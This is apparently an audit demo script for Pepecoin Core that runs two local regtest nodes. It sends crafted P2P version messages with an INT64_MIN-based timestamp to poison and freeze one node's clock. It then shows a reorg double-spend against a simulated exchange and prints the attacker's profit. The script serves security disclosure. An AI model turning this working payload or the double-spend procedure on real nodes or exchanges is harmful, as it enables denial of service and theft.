#!/usr/bin/env python3
# Copyright (c) 2024 The Pepecoin Core developers
# Distributed under the MIT software license.
#
# =============================================================================
#  MALICIOUS-OPERATOR SIMULATION  --  SELF-CONTAINED ISOLATED REGTEST
# =============================================================================
# Educational impact demo: shows, end to end, how a bad actor PROFITS from the
# weaknesses this audit found, and prints the attacker's profit-and-loss.
#
# It launches its OWN two regtest nodes on 127.0.0.1 (an "exchange"/victim and
# the attacker) and drives them. It does NOT connect to, read, or touch your
# real node or any external peer -- everything happens inside a throwaway
# regtest network this script creates and tears down. On regtest one CPU is
# 100% of the hashrate, which is why the attack "works" instantly here; on a
# real chain the same steps need true majority hashrate for the confirmation
# window -- there is no software shortcut, which is exactly the point.
#
# Two phases:
#   PHASE 1 (PEP-001, optional): the attacker freezes the victim's node with the
#     abs64(INT64_MIN) time bug, showing it stops extending the tip. This is the
#     "suppress/stall honest nodes" force-multiplier -- a DoS, not a theft.
#   PHASE 2 (the payoff): a reorg DOUBLE-SPEND. The attacker deposits to the
#     exchange, the exchange credits it after N confirmations (ships goods /
#     releases a withdrawal), then the attacker reveals a heavier chain that
#     erases the deposit. Net: the attacker keeps the coins AND the goods.
#
# Usage:  python3 run_malicious_node.py            # both phases
#         python3 run_malicious_node.py --no-freeze # just the double-spend
# =============================================================================

import argparse, hashlib, json, os, shutil, socket, struct, subprocess, sys, time
from decimal import Decimal

SRC = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "src"))
PEPECOIND = os.environ.get("PEPECOIND", os.path.join(SRC, "pepecoind"))
CLI = os.path.join(SRC, "pepecoin-cli")
WORK = os.environ.get("MAL_DIR", "/tmp/pepe_malsim")
REGTEST_MAGIC = b"\xfa\xbf\xb5\xda"
INT64_MIN = -(2 ** 63)

EXCHANGE = {"name": "exchange", "rpc": 25101, "p2p": 25102}   # the victim
ATTACKER = {"name": "attacker", "rpc": 25111, "p2p": 25112}
N_CONFIRMATIONS = 1   # how many confs the "exchange" waits before crediting


# ---------- node plumbing ----------------------------------------------------
def conf(node):
    d = os.path.join(WORK, node["name"]); os.makedirs(d, exist_ok=True)
    open(os.path.join(d, "pepecoin.conf"), "w").write(
        "regtest=1\nserver=1\nlisten=1\nbind=127.0.0.1\ndiscover=0\n"
        "rpcuser=u\nrpcpassword=p\nrpcport=%d\nport=%d\nfallbackfee=0.001\n" % (node["rpc"], node["p2p"]))
    return d

def cli(node, *a):
    d = os.path.join(WORK, node["name"])
    r = subprocess.run([CLI, "-datadir=%s" % d, "-rpcport=%d" % node["rpc"],
                        "-rpcuser=u", "-rpcpassword=p"] + [str(x) for x in a],
                       capture_output=True, text=True)
    if r.returncode != 0:
        raise RuntimeError("cli %s: %s" % (" ".join(map(str, a)), r.stderr.strip()))
    return r.stdout.strip()

def start(node): subprocess.run([PEPECOIND, "-datadir=%s" % conf(node), "-daemon"], capture_output=True)
def stop(node):
    try: cli(node, "stop")
    except Exception: pass
def wait(node):
    for _ in range(30):
        try: cli(node, "getblockcount"); return
        except Exception: time.sleep(1)
    raise SystemExit("%s never came up" % node["name"])
def height(node): return int(cli(node, "getblockcount"))
def offset(node): return json.loads(cli(node, "getnetworkinfo"))["timeoffset"]
def connect(a, b): cli(a, "addnode", "127.0.0.1:%d" % b["p2p"], "onetry")
def split(a, b):
    try: cli(a, "disconnectnode", "127.0.0.1:%d" % b["p2p"])
    except Exception: pass
    cli(a, "setban", "127.0.0.1", "add", 3600); cli(b, "setban", "127.0.0.1", "add", 3600)
def rejoin(a, b):
    for n in (a, b):
        try: cli(n, "clearbanned")
        except Exception: pass
    connect(a, b)


# ---------- PEP-001 loopback poison (localhost only) -------------------------
def _dsha(b): return hashlib.sha256(hashlib.sha256(b).digest()).digest()
def _wire(cmd, p): return REGTEST_MAGIC + cmd.encode().ljust(12, b"\0") + struct.pack("<I", len(p)) + _dsha(p)[:4] + p
def _netaddr(ip, port): return struct.pack("<Q", 1) + b"\x00"*10 + b"\xff\xff" + socket.inet_aton(ip) + struct.pack(">H", port)
def _ver(evil, dstport):
    p = struct.pack("<i", 70015)+struct.pack("<Q",1)+struct.pack("<q",evil)+_netaddr("127.0.0.1",dstport)+_netaddr("0.0.0.0",0)+struct.pack("<Q",7)
    ua=b"/mal/"; return p+struct.pack("<B",len(ua))+ua+struct.pack("<i",0)+struct.pack("<B",0)
def poison(dstport, n=8):
    time.sleep((1.0 - time.time() % 1.0) + 0.05)
    evil = INT64_MIN + int(time.time()); conns = []
    for i in range(n):
        s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("127.0.0.%d" % (2+i), 0)); s.settimeout(5); s.connect(("127.0.0.1", dstport))
        s.sendall(_wire("version", _ver(evil, dstport)))
        try: s.recv(4096); s.sendall(_wire("verack", b"")); s.recv(4096)
        except socket.timeout: pass
        conns.append(s)
    time.sleep(2)
    for s in conns:
        try: s.close()
        except OSError: pass


def phase1_freeze():
    print("\n==================== PHASE 1: freeze the victim (PEP-001) ====================")
    print("The attacker poisons the exchange node's network clock over loopback.")
    before = offset(EXCHANGE)
    for _ in range(6):
        poison(EXCHANGE["p2p"], 8)
        if offset(EXCHANGE) not in (0, None): break
    off = offset(EXCHANGE)
    print("   exchange timeoffset: %d -> %d" % (before, off))
    if abs(off) <= 70*60:
        print("   (exchange node is PATCHED: clamp held; freeze not available. Skipping.)")
        return False
    rc = subprocess.run([CLI, "-datadir=%s" % os.path.join(WORK, EXCHANGE["name"]),
                         "-rpcport=%d" % EXCHANGE["rpc"], "-rpcuser=u", "-rpcpassword=p",
                         "generatetoaddress", "1", cli(EXCHANGE, "getnewaddress")],
                        capture_output=True, text=True)
    print("   exchange tries to mine a block ->", (rc.stderr.strip() or "ok").splitlines()[0])
    print("   RESULT: the victim's node is frozen (rejects all blocks until restart).")
    print("   Bad-actor benefit: stall the victim / suppress its hashrate = reorg force-multiplier.")
    # un-freeze for phase 2 by restarting the exchange node (clears the offset)
    stop(EXCHANGE); time.sleep(2); start(EXCHANGE); wait(EXCHANGE)
    print("   (simulation restarts the victim to clear the poison before Phase 2.)")
    return True


def phase2_double_spend():
    print("\n==================== PHASE 2: double-spend the exchange ====================")
    rejoin(EXCHANGE, ATTACKER); time.sleep(2)
    # attacker funds itself and both nodes sync
    cli(ATTACKER, "generatetoaddress", 120, cli(ATTACKER, "getnewaddress")); time.sleep(3)
    exch_addr = cli(EXCHANGE, "getnewaddress")

    # attacker picks one coin U to spend two ways
    U = max(json.loads(cli(ATTACKER, "listunspent", 1)), key=lambda u: Decimal(str(u["amount"])))
    Uval = Decimal(str(U["amount"])); fee = Decimal("1"); deposit = Decimal("1000")
    ins = json.dumps([{"txid": U["txid"], "vout": U["vout"]}])
    to_exchange = json.loads(cli(ATTACKER, "signrawtransaction",
        cli(ATTACKER, "createrawtransaction", ins,
            json.dumps({exch_addr: float(deposit), cli(ATTACKER,"getnewaddress"): float(Uval-deposit-fee)}))))["hex"]
    to_self = json.loads(cli(ATTACKER, "signrawtransaction",
        cli(ATTACKER, "createrawtransaction", ins,
            json.dumps({cli(ATTACKER,"getnewaddress"): float(Uval-fee)}))))["hex"]

    # partition: honest/exchange side gets the deposit; attacker mines privately
    split(EXCHANGE, ATTACKER)
    cli(EXCHANGE, "sendrawtransaction", to_exchange)
    cli(EXCHANGE, "generatetoaddress", N_CONFIRMATIONS, cli(EXCHANGE, "getnewaddress"))
    credited = Decimal(cli(EXCHANGE, "getreceivedbyaddress", exch_addr, N_CONFIRMATIONS))
    print("   attacker deposits %s PEPE; exchange sees %s (%d conf) -> RELEASES goods/withdrawal"
          % (deposit, credited, N_CONFIRMATIONS))

    # attacker's private heavier chain double-spends U back to itself
    cli(ATTACKER, "sendrawtransaction", to_self)
    cli(ATTACKER, "generatetoaddress", N_CONFIRMATIONS + 5, cli(ATTACKER, "getnewaddress"))
    print("   attacker privately mines a heavier chain (height %d > exchange %d)"
          % (height(ATTACKER), height(EXCHANGE)))

    # reveal -> exchange reorgs to the heavier chain -> deposit erased
    rejoin(EXCHANGE, ATTACKER); time.sleep(4)
    final = Decimal(cli(EXCHANGE, "getreceivedbyaddress", exch_addr, 0))
    print("   after reorg, exchange received on that address: %s PEPE" % final)

    print("\n==================== ATTACKER P&L ====================")
    if final == 0:
        print("   deposit reversed: exchange got 0 (thought it got %s and already paid out)" % deposit)
        print("   attacker on-chain coins: intact (U was respent to attacker)")
        print("   >>> ATTACKER NET GAIN  = %s PEPE-equivalent (the goods/withdrawal the exchange released)" % deposit)
        print("   >>> VICTIM  NET LOSS   = %s" % deposit)
    else:
        print("   deposit survived (attacker chain was not heavier) -> no gain")


def main():
    ap = argparse.ArgumentParser(description="Isolated regtest simulation of a malicious operator.")
    ap.add_argument("--no-freeze", action="store_true", help="skip Phase 1 (PEP-001 freeze)")
    args = ap.parse_args()
    if not os.path.exists(PEPECOIND):
        raise SystemExit("build pepecoind first (make -C src)")
    if os.path.exists(WORK): shutil.rmtree(WORK)
    os.makedirs(WORK)

    print("Launching ISOLATED regtest network (loopback only): exchange + attacker nodes.")
    start(EXCHANGE); start(ATTACKER); wait(EXCHANGE); wait(ATTACKER)
    connect(EXCHANGE, ATTACKER); time.sleep(2)
    cli(ATTACKER, "generatetoaddress", 10, cli(ATTACKER, "getnewaddress")); time.sleep(2)

    try:
        if not args.no_freeze:
            phase1_freeze()
        phase2_double_spend()
    finally:
        print("\n== teardown ==")
        stop(EXCHANGE); stop(ATTACKER); time.sleep(2)
        print("done. Nothing external was touched; this was a self-contained regtest.")


if __name__ == "__main__":
    main()
